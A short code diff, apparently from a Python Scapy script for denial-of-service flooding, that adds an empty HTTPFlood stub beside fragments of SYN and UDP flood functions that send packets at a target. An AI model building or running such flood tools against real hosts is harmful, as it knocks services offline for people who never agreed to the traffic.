@@ -54,6 +54,9 @@ def SynFlood(dstIP,dstPort,repeat):
         # WARNING: Mac address to reach destination not found. Using broadcast.//IP 주소 설정 안하면 뜨던데?
         send(IP_Packet/TCP_Packet,verbose=0)
 
+def HTTPFlood(dstIP,dstPort,repeat):
+    pass
+
 def UDPFlood(dstIP,dstPort,repeat):
     for x in range(int(repeat)):
         IP_Packet = IP()
